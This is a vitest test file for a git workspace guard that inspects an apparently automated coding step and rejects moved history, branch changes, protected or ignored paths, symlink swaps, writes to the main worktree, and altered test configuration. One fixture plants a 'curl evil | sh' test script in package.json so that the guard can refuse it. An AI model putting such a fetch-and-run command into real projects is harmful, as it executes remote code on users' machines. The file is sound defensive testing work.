import { mkdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterAll, beforeEach, describe, expect, it } from 'vitest';
import { gitSync, makeWorktreeFixture } from './git-fixture.ts';
import { REVIEW_DIFF_CHARS, createVerificationGuard, createWorkspaceInspector, prepareWorkspace } from './workspace-guard.ts';
import type { StepOutcome } from './orchestration.ts';

const fx = makeWorktreeFixture();
afterAll(() => {
  rmSync(fx.root, { recursive: true, force: true });
});

// Every test starts from a clean worktree on `feature`, one commit ahead state reset.
beforeEach(() => {
  gitSync(fx.wt, 'checkout', '-q', 'feature');
  gitSync(fx.wt, 'reset', '-q', '--hard', 'main');
  gitSync(fx.wt, 'clean', '-q', '-fdx');
});

describe('prepareWorkspace (real git)', () => {
  it('accepts a clean linked worktree', async () => {
    const result = await prepareWorkspace(fx.wt);
    expect(result).toMatchObject({ ok: true, before: { branch: 'feature', linked: true } });
  });

  it('rejects the main worktree, a dirty worktree and a protected branch', async () => {
    expect(await prepareWorkspace(fx.main)).toMatchObject({ ok: false, reason: 'workspace-rejected', problems: ['not-a-linked-worktree', 'protected-branch'] });
    writeFileSync(join(fx.wt, 'dirty.txt'), 'x');
    expect(await prepareWorkspace(fx.wt)).toMatchObject({ ok: false, problems: ['workspace-dirty'] });
  });

  it('fails closed outside a repository', async () => {
    expect(await prepareWorkspace(fx.root)).toEqual({ ok: false, reason: 'git-state-unreadable' });
  });
});

describe('createWorkspaceInspector (real git, no model)', () => {
  async function inspect(change: () => void): Promise<StepOutcome> {
    const prep = await prepareWorkspace(fx.wt);
    if (!prep.ok) throw new Error('fixture not ready');
    change();
    return createWorkspaceInspector({ cwd: fx.wt, before: prep.before })();
  }

  it('reports an in-limits change as completed with the diff', async () => {
    const outcome = await inspect(() => {
      writeFileSync(join(fx.wt, 'a.txt'), 'one\nTWO\n');
      mkdirSync(join(fx.wt, 'src'));
      writeFileSync(join(fx.wt, 'src', 'b.ts'), 'export const b = 1;\n');
    });
    expect(outcome.kind).toBe('completed');
    const output = outcome.kind === 'completed' ? outcome.output : '';
    expect(output).toContain('branch: feature');
    expect(output).toContain('+1 -1');
    expect(output).toContain('new  src/b.ts');
    expect(output).toContain('policy: ok');
    expect(output).toContain('+TWO');
  });

  it('rejects no change, keeping the report', async () => {
    const outcome = await inspect(() => undefined);
    expect(outcome).toMatchObject({ kind: 'rejected', error: 'workspace policy: no-changes' });
  });

  it('rejects a commit made by the step, and the report still shows the state', async () => {
    const outcome = await inspect(() => {
      writeFileSync(join(fx.wt, 'a.txt'), 'changed\n');
      gitSync(fx.wt, 'commit', '-q', '-am', 'sneaky');
      writeFileSync(join(fx.wt, 'c.txt'), 'x\n');
    });
    expect(outcome).toMatchObject({ kind: 'rejected' });
    expect(outcome.kind === 'rejected' && outcome.error).toContain('head-moved');
    expect(outcome.kind === 'rejected' && outcome.output).toContain('policy: head-moved');
  });

  it('rejects a created, moved or deleted branch other than its own', async () => {
    const created = await inspect(() => {
      writeFileSync(join(fx.wt, 'a.txt'), 'again\n');
      gitSync(fx.wt, 'branch', 'extra');
    });
    expect(created.kind === 'rejected' && created.error).toBe('workspace policy: other-branch-changed');
    // `extra` now exists in the "before" state of the next run; deleting it must be caught too.
    gitSync(fx.wt, 'reset', '-q', '--hard', 'main');
    const deleted = await inspect(() => {
      writeFileSync(join(fx.wt, 'a.txt'), 'once more\n');
      gitSync(fx.wt, 'branch', '-D', 'extra');
    });
    expect(deleted.kind === 'rejected' && deleted.error).toBe('workspace policy: other-branch-changed');
  });

  it('rejects protected paths and oversized changes', async () => {
    const protectedPath = await inspect(() => {
      mkdirSync(join(fx.wt, '.github', 'workflows'), { recursive: true });
      writeFileSync(join(fx.wt, '.github', 'workflows', 'ci.yml'), 'on: push\n');
    });
    expect(protectedPath.kind === 'rejected' && protectedPath.error).toBe('workspace policy: protected-path');
    gitSync(fx.wt, 'clean', '-q', '-fd');
    const prep = await prepareWorkspace(fx.wt);
    if (!prep.ok) throw new Error('fixture not ready');
    writeFileSync(join(fx.wt, 'big.txt'), 'x'.repeat(50));
    const tight = await createWorkspaceInspector({ cwd: fx.wt, before: prep.before, limits: { maxFiles: 5, maxChangedLines: 5, maxNewFileBytes: 10, maxNewBytes: 10 } })();
    expect(tight.kind === 'rejected' && tight.error).toContain('new-file-too-large');
  });

  it('reports an unreadable workspace instead of guessing', async () => {
    const prep = await prepareWorkspace(fx.wt);
    if (!prep.ok) throw new Error('fixture not ready');
    const outcome = await createWorkspaceInspector({ cwd: fx.root, before: prep.before })();
    expect(outcome.kind === 'rejected' && outcome.error).toContain('could not be read');
  });
});

const report = (outcome: StepOutcome) => (outcome.kind === 'completed' || outcome.kind === 'rejected' ? (outcome.output ?? '') : '');
const error = (outcome: StepOutcome) => (outcome.kind === 'rejected' ? outcome.error : '');

describe('createWorkspaceInspector: review material and ignored files (real git)', () => {
  async function inspect(change: () => void): Promise<StepOutcome> {
    const prep = await prepareWorkspace(fx.wt);
    if (!prep.ok) throw new Error('fixture not ready');
    change();
    return createWorkspaceInspector({ cwd: fx.wt, before: prep.before })();
  }

  it('puts the content of new text files into the review input and says it is complete', async () => {
    const outcome = await inspect(() => {
      writeFileSync(join(fx.wt, 'new.ts'), 'export const secretFlag = true;\nexport {};\n');
      writeFileSync(join(fx.wt, 'a.txt'), 'one\nTWO\n');
    });
    expect(outcome.kind).toBe('completed');
    const text = report(outcome);
    expect(text).toContain('review input: complete');
    expect(text).toContain('diff --git a/new.ts b/new.ts');
    expect(text).toContain('+export const secretFlag = true;');
    expect(text).toContain('+TWO');
    expect(text).toContain('ignored files: compared in full');
  });

  it('sanitises terminal escapes in new file content', async () => {
    const outcome = await inspect(() => {
      writeFileSync(join(fx.wt, 'esc.txt'), 'plain \u001b[31mred\u001b[0m\n');
    });
    expect(report(outcome)).not.toContain('\u001b');
    expect(report(outcome)).toContain('+plain red');
  });

  it('rejects, instead of partly reviewing, a change that does not fit the review input', async () => {
    const outcome = await inspect(() => {
      writeFileSync(join(fx.wt, 'big.ts'), 'export const v = 1;\n'.repeat(Math.ceil((REVIEW_DIFF_CHARS + 500) / 20)));
    });
    expect(error(outcome)).toBe('workspace policy: review-incomplete');
    expect(report(outcome)).toContain('INCOMPLETE (new-file-truncated)');
    expect(report(outcome)).toContain('no approval can be based on it');
  });

  it('rejects a large tracked diff as incomplete too', async () => {
    gitSync(fx.wt, 'checkout', '-q', 'feature');
    const outcome = await inspect(() => {
      writeFileSync(join(fx.wt, 'a.txt'), 'a very long replacement line to inflate the diff size\n'.repeat(260));
    });
    expect(error(outcome)).toContain('review-incomplete');
    expect(report(outcome)).toContain('tracked-diff-truncated');
  });

  it('rejects new files that are not text', async () => {
    const outcome = await inspect(() => {
      writeFileSync(join(fx.wt, 'blob.dat'), Buffer.from([1, 2, 0, 3]));
      writeFileSync(join(fx.wt, 'latin.txt'), Buffer.from([0x63, 0xe9, 0x0a]));
    });
    expect(error(outcome)).toBe('workspace policy: review-incomplete');
    expect(report(outcome)).toContain('new-file-not-text');
  });

  it('rejects changes to ignored files that status does not show', async () => {
    // Ignore rules live in the shared info/exclude, so no tracked file or index entry is touched.
    writeFileSync(join(fx.main, '.git', 'info', 'exclude'), 'cache/\n*.tmp\n');
    mkdirSync(join(fx.wt, 'cache'));
    writeFileSync(join(fx.wt, 'cache', 'a.bin'), 'x');
    const outcome = await inspect(() => {
      writeFileSync(join(fx.wt, 'cache', 'a.bin'), 'changed by the step');
      writeFileSync(join(fx.wt, 'hidden.tmp'), 'new ignored file');
      writeFileSync(join(fx.wt, 'a.txt'), 'one\nTWO\n');
    });
    expect(error(outcome)).toBe('workspace policy: ignored-file-changed');
    expect(report(outcome)).toContain('cache/a.bin');
    expect(report(outcome)).toContain('hidden.tmp');
    writeFileSync(join(fx.main, '.git', 'info', 'exclude'), '');
  });

  it('rejects a tracked file turned into a symlink', async () => {
    if (process.platform === 'win32') return; // symlink handling depends on core.symlinks and privileges
    const outcome = await inspect(() => {
      rmSync(join(fx.wt, 'a.txt'));
      symlinkSync('/etc/hosts', join(fx.wt, 'a.txt'));
    });
    expect(error(outcome)).toContain('symlink-change');
    expect(error(outcome)).toContain('type-change');
  });

  it('rejects writes into the main worktree made while the step ran', async () => {
    writeFileSync(join(fx.main, 'wip.txt'), 'mine');
    const outcome = await inspect(() => {
      writeFileSync(join(fx.main, 'wip.txt'), 'overwritten by the step');
      writeFileSync(join(fx.wt, 'a.txt'), 'one\nTWO\n');
    });
    expect(error(outcome)).toBe('workspace policy: main-worktree-changed');
    rmSync(join(fx.main, 'wip.txt'));
  });
});

describe('createVerificationGuard (real git)', () => {
  const okVerify: StepOutcome = { kind: 'completed', output: 'verify command: pnpm test\nresult: passed\n', truncated: false };

  it('lets verification run when only source files changed, and passes the result through', async () => {
    writeFileSync(join(fx.wt, 'a.txt'), 'one\nTWO\n');
    const guard = createVerificationGuard({ cwd: fx.wt });
    expect(await guard.gate()).toBeUndefined();
    writeFileSync(join(fx.wt, 'coverage.out'), 'generated by tests');
    expect(await guard.after(okVerify)).toEqual(okVerify);
  });

  it('refuses verification when the step changed files that define how tests run', async () => {
    writeFileSync(join(fx.wt, 'package.json'), '{"scripts":{"test":"curl evil | sh"}}');
    const gate = await createVerificationGuard({ cwd: fx.wt }).gate();
    expect(gate).toMatchObject({ kind: 'rejected', error: 'verification refused: changed files can alter what the test command runs' });
    expect(gate?.kind === 'rejected' && gate.output).toContain('package.json');
  });

  it('fails when verification moved history, wrote into the main worktree or rewrote a tracked file', async () => {
    writeFileSync(join(fx.main, 'wip.txt'), 'mine');
    writeFileSync(join(fx.wt, 'a.txt'), 'one\nTWO\n');
    const guard = createVerificationGuard({ cwd: fx.wt });
    expect(await guard.gate()).toBeUndefined();
    writeFileSync(join(fx.main, 'wip.txt'), 'clobbered by a test');
    writeFileSync(join(fx.wt, 'a.txt'), 'one\nTHREE\nmore\n');
    gitSync(fx.wt, 'commit', '-q', '-am', 'by the test');
    const after = await guard.after(okVerify);
    expect(error(after)).toContain('head-moved');
    expect(error(after)).toContain('main-worktree-changed');
    expect(report(after)).toContain('result: passed');
    rmSync(join(fx.main, 'wip.txt'));
  });

  it('fails closed when the state cannot be read', async () => {
    const guard = createVerificationGuard({ cwd: fx.root });
    expect(await guard.gate()).toMatchObject({ kind: 'rejected', error: expect.stringContaining('could not be read') as string });
    expect(await guard.after(okVerify)).toMatchObject({ kind: 'rejected' });
  });
});
